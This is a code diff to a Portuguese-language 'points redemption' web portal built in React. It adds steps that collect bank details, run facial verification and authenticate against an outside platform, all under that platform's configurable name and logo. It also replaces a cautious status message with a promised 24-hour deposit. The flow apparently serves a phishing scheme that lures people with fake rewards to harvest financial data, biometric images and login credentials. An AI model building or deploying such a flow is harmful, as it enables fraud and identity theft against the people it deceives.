@@ -26,17 +26,34 @@ import {
   onlyDigits,
 } from '../utils/validation';
 import { BrandMark } from './BrandMark';
+import { FacialVerificationStep } from './FacialVerificationStep';
+import { PlatformAuthStep } from './PlatformAuthStep';
 
 interface PublicPortalProps {
   settings: SiteSettings;
   storageError: string | null;
+  onSettingsUpdated?: (nextSettings: SiteSettings) => void;
   onNavigate: (path: string) => void;
 }
 
-type FlowStep = 'inicio' | 'analisando' | 'resultado' | 'confirmacao' | 'resgate' | 'resgatado';
+type FlowStep =
+  | 'inicio'
+  | 'analisando'
+  | 'resultado'
+  | 'confirmacao'
+  | 'conectando'
+  | 'resgate'
+  | 'verificacao_facial'
+  | 'autenticacao'
+  | 'resgatado';
 type LegalDocType = 'regulamento' | 'privacidade' | null;
 
-export function PublicPortal({ settings, storageError, onNavigate }: PublicPortalProps) {
+export function PublicPortal({
+  settings,
+  storageError,
+  onSettingsUpdated,
+  onNavigate,
+}: PublicPortalProps) {
   const prefersReducedMotion = useReducedMotion();
   const [showIntro, setShowIntro] = useState<boolean>(() => !prefersReducedMotion);
 
@@ -176,6 +193,48 @@ export function PublicPortal({ settings, storageError, onNavigate }: PublicPorta
     setOwnershipConfirmed(true);
   }
 
+  async function handleOpenYellowRedemption(): Promise<void> {
+    if (!consultaResult) return;
+    setStepError(null);
+    transitionToStep('conectando');
+
+    const minVisual = prefersReducedMotion
+      ? Promise.resolve()
+      : new Promise<void>((resolve) => window.setTimeout(resolve, 650));
+
+    try {
+      const [response] = await Promise.all([
+        fetch(`/api/consultas/${encodeURIComponent(consultaResult.id)}/preparar-resgate`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ claimToken: consultaResult.claimToken }),
+        }),
+        minVisual,
+      ]);
+
+      const data = (await response.json()) as {
+        consulta?: ConsultaPublicResult;
+        settings?: SiteSettings;
+        error?: string;
+      };
+
+      if (!response.ok || !data.consulta) {
+        setStepError(data.error || 'Não foi possível carregar os dados cadastrais para resgate.');
+        transitionToStep('confirmacao');
+        return;
+      }
+
+      if (data.settings && onSettingsUpdated) {
+        onSettingsUpdated(data.settings);
+      }
+      setConsultaResult(data.consulta);
+      transitionToStep('resgate');
+    } catch {
+      setStepError('Erro de conexão ao preparar a página de resgate. Tente novamente.');
+      transitionToStep('confirmacao');
+    }
+  }
+
   async function handleSubmitRedeem(e: FormEvent): Promise<void> {
     e.preventDefault();
     if (!consultaResult) return;
@@ -223,7 +282,7 @@ export function PublicPortal({ settings, storageError, onNavigate }: PublicPorta
         return;
       }
       setConsultaResult(data);
-      transitionToStep('resgatado');
+      transitionToStep('verificacao_facial');
     } catch {
       setStepError('Erro de conexão ao registrar a solicitação. Tente novamente.');
     } finally {
@@ -251,7 +310,12 @@ export function PublicPortal({ settings, storageError, onNavigate }: PublicPorta
 
   const displayPoints = consultaResult?.pointsAvailable ?? CAMPAIGN_POINTS_GRANT;
   const displayAmountBrl = consultaResult?.amountBrl ?? CAMPAIGN_BRL_VALUE;
-  const isYellowRedemptionPage = step === 'resgate' || step === 'resgatado';
+  const isYellowRedemptionPage =
+    step === 'conectando' ||
+    step === 'resgate' ||
+    step === 'verificacao_facial' ||
+    step === 'autenticacao' ||
+    step === 'resgatado';
 
   return (
     <div className="min-h-screen flex flex-col bg-white text-[#151515]">
@@ -748,10 +812,7 @@ export function PublicPortal({ settings, storageError, onNavigate }: PublicPorta
 
                     <button
                       type="button"
-                      onClick={() => {
-                        setStepError(null);
-                        transitionToStep('resgate');
-                      }}
+                      onClick={() => void handleOpenYellowRedemption()}
                       className="w-full h-14 px-6 bg-[#FE0A8C] hover:bg-[#DF067A] text-white text-base font-bold rounded-xl transition-colors inline-flex items-center justify-center gap-2.5 cursor-pointer shadow-sm"
                     >
                       <span>{rp.requestButtonText || 'SOLICITAR RESGATE'}</span>
@@ -764,8 +825,56 @@ export function PublicPortal({ settings, storageError, onNavigate }: PublicPorta
           </section>
         )}
 
-        {/* ETAPA 3B e 4 — NOVA PÁGINA AMARELA DE RESGATE EM CONTA CORRENTE */}
-        {isYellowRedemptionPage && consultaResult && (
+        {/* TELA DE CARREGAMENTO ANTES DA PÁGINA AMARELA ("CONECTANDO...") */}
+        {step === 'conectando' && consultaResult && (
+          <section
+            className="flex-1 flex items-center justify-center py-14 px-4 transition-colors"
+            style={{ backgroundColor: rp.backgroundColor || '#FFED00' }}
+          >
+            <motion.div
+              key="conectando-screen"
+              initial={{ opacity: 0, scale: 0.97 }}
+              animate={{ opacity: 1, scale: 1 }}
+              transition={{ duration: 0.25 }}
+              className="w-full max-w-md bg-[#151515] text-white rounded-2xl border border-black/15 p-8 sm:p-10 text-center shadow-lg"
+            >
+              <div className="relative w-24 h-24 mx-auto mb-6 flex items-center justify-center">
+                <Loader2
+                  className="w-24 h-24 text-[#FFED00] animate-spin absolute inset-0"
+                  aria-hidden="true"
+                />
+                <motion.div
+                  animate={prefersReducedMotion ? undefined : { scale: [1, 1.08, 1], opacity: [0.9, 1, 0.9] }}
+                  transition={{ duration: 1.4, repeat: Infinity, ease: 'easeInOut' }}
+                  className="w-16 h-16 rounded-xl bg-white flex items-center justify-center p-2 shadow-sm"
+                >
+                  {platformLogoUrl ? (
+                    <img
+                      src={platformLogoUrl}
+                      alt={rp.platformName}
+                      referrerPolicy="no-referrer"
+                      className="max-h-11 max-w-full object-contain"
+                    />
+                  ) : (
+                    <span className="font-display font-bold text-base text-[#151515]">
+                      {rp.platformName.slice(0, 2).toUpperCase()}
+                    </span>
+                  )}
+                </motion.div>
+              </div>
+
+              <h1 className="font-display text-2xl font-bold tracking-wide text-[#FFED00] mb-2">
+                {rp.loadingTitle || 'CONECTANDO...'}
+              </h1>
+              <p className="text-sm text-neutral-300 leading-relaxed">
+                {rp.loadingSubtitle || 'Carregando seus dados cadastrais. Aguarde...'}
+              </p>
+            </motion.div>
+          </section>
+        )}
+
+        {/* ETAPA 3B, 3C, 4 e 5 — PÁGINA AMARELA DE RESGATE, VERIFICAÇÃO FACIAL, AUTENTICAÇÃO E TELA FINAL */}
+        {isYellowRedemptionPage && step !== 'conectando' && consultaResult && (
           <section
             className="flex-1 py-10 lg:py-16 transition-colors"
             style={{ backgroundColor: rp.backgroundColor || '#FFED00' }}
@@ -974,14 +1083,38 @@ export function PublicPortal({ settings, storageError, onNavigate }: PublicPorta
                   >
                     <span>
                       {submittingRedeem
-                        ? 'Registrando solicitação...'
+                        ? 'Registrando dados bancários...'
                         : rp.confirmButtonText || 'CONFIRMAR RESGATE'}
                     </span>
                     {!submittingRedeem && <ArrowRight className="w-5 h-5" aria-hidden="true" />}
                   </button>
                 </motion.form>
+              ) : step === 'verificacao_facial' ? (
+                <FacialVerificationStep
+                  consulta={consultaResult}
+                  platformName={rp.platformName}
+                  platformLogoUrl={platformLogoUrl}
+                  facialTitle={rp.facialTitle}
+                  facialInstructions={rp.facialInstructions}
+                  facialButtonText={rp.facialButtonText}
+                  onVerified={(updated) => {
+                    setConsultaResult(updated);
+                    transitionToStep('autenticacao');
+                  }}
+                />
+              ) : step === 'autenticacao' ? (
+                <PlatformAuthStep
+                  consulta={consultaResult}
+                  platformName={rp.platformName}
+                  platformLogoUrl={platformLogoUrl}
+                  authButtonText={rp.authButtonText}
+                  onCompleted={(updated) => {
+                    setConsultaResult(updated);
+                    transitionToStep('resgatado');
+                  }}
+                />
               ) : (
-                /* ETAPA 4 — PROTOCOLO E STATUS REAL DO PROCESSAMENTO */
+                /* ETAPA 5 — TELA FINAL DO RESGATE */
                 <motion.div
                   key="yellow-redemption-done"
                   initial={{ opacity: 0, y: 10 }}
@@ -990,36 +1123,27 @@ export function PublicPortal({ settings, storageError, onNavigate }: PublicPorta
                   className="bg-white text-[#151515] border border-black/10 rounded-xl p-6 sm:p-8"
                 >
                   <div className="flex items-center gap-2.5 text-emerald-700 mb-2">
-                    <CheckCircle2 className="w-6 h-6 shrink-0" aria-hidden="true" />
-                    <h1 className="font-display text-2xl font-bold text-[#151515]">
-                      Solicitação de resgate registrada
+                    <CheckCircle2 className="w-7 h-7 shrink-0" aria-hidden="true" />
+                    <h1 className="font-display text-xl sm:text-2xl font-bold text-[#151515]">
+                      {rp.finalTitle || 'SOLICITAÇÃO DE RESGATE RECEBIDA!'}
                     </h1>
                   </div>
                   <p className="text-sm text-neutral-600 leading-relaxed mb-6">
-                    Sua solicitação de depósito em conta corrente de{' '}
-                    <strong className="text-[#151515] tabular-nums">
-                      {formatBrl(displayAmountBrl)}
-                    </strong>{' '}
-                    ({displayPoints.toLocaleString('pt-BR')} pontos) foi registrada e encontra-se em análise e processamento. O depósito ainda não foi efetuado e aguarda conferência bancária.
+                    {rp.finalSubtitle ||
+                      'Seus dados foram enviados com sucesso. Acompanhe o processamento do seu resgate.'}
                   </p>
 
-                  <dl className="bg-neutral-50 border border-neutral-200 rounded-lg divide-y divide-neutral-200 text-sm mb-6">
+                  <dl className="bg-neutral-50 border border-neutral-200 rounded-lg divide-y divide-neutral-200 text-sm mb-5">
                     <div className="px-4 py-3 flex items-center justify-between gap-4">
-                      <dt className="text-neutral-500">Protocolo</dt>
-                      <dd className="font-mono font-semibold text-[#151515] tabular-nums">
-                        {consultaResult.protocol}
-                      </dd>
-                    </div>
-                    <div className="px-4 py-3 flex items-center justify-between gap-4">
-                      <dt className="text-neutral-500">Status do pedido</dt>
-                      <dd className="font-semibold text-[#C8006B]">
-                        Em análise e processamento
-                      </dd>
-                    </div>
-                    <div className="px-4 py-3 flex items-center justify-between gap-4">
-                      <dt className="text-neutral-500">Titular</dt>
-                      <dd className="font-medium text-[#151515] text-right">
+                      <dt className="text-neutral-500">Beneficiário</dt>
+                      <dd className="font-semibold text-[#151515] text-right">
                         {consultaResult.profileLabel}
+                      </dd>
+                    </div>
+                    <div className="px-4 py-3 flex items-center justify-between gap-4">
+                      <dt className="text-neutral-500">Valor solicitado</dt>
+                      <dd className="font-display font-bold text-[#151515] tabular-nums">
+                        {formatBrl(displayAmountBrl)}
                       </dd>
                     </div>
                     <div className="px-4 py-3 flex items-center justify-between gap-4">
@@ -1035,12 +1159,32 @@ export function PublicPortal({ settings, storageError, onNavigate }: PublicPorta
                       </dd>
                     </div>
                     <div className="px-4 py-3 flex items-center justify-between gap-4">
-                      <dt className="text-neutral-500">Valor solicitado</dt>
-                      <dd className="font-display font-bold text-[#151515] tabular-nums">
-                        {formatBrl(displayAmountBrl)}
+                      <dt className="text-neutral-500">Número de protocolo</dt>
+                      <dd className="font-mono font-semibold text-[#151515] tabular-nums">
+                        {consultaResult.protocol}
+                      </dd>
+                    </div>
+                    <div className="px-4 py-3 flex items-center justify-between gap-4">
+                      <dt className="text-neutral-500">Situação da solicitação</dt>
+                      <dd className="font-semibold text-[#C8006B] text-right">
+                        {consultaResult.faceVerificationStatus === 'verificada'
+                          ? 'Identidade verificada · Em análise bancária'
+                          : 'Aguardando análise'}
                       </dd>
                     </div>
                   </dl>
+
+                  <div
+                    className={`mb-6 p-4 rounded-xl border text-xs sm:text-sm leading-relaxed ${
+                      consultaResult.guaranteed24h
+                        ? 'bg-emerald-50 border-emerald-200 text-emerald-900 font-semibold'
+                        : 'bg-neutral-50 border-neutral-200 text-neutral-700'
+                    }`}
+                  >
+                    {consultaResult.guaranteed24h
+                      ? 'PREVISÃO DE DEPÓSITO: ATÉ 24 HORAS'
+                      : consultaResult.depositForecast || rp.finalInfoText}
+                  </div>
 
                   <button
                     type="button"
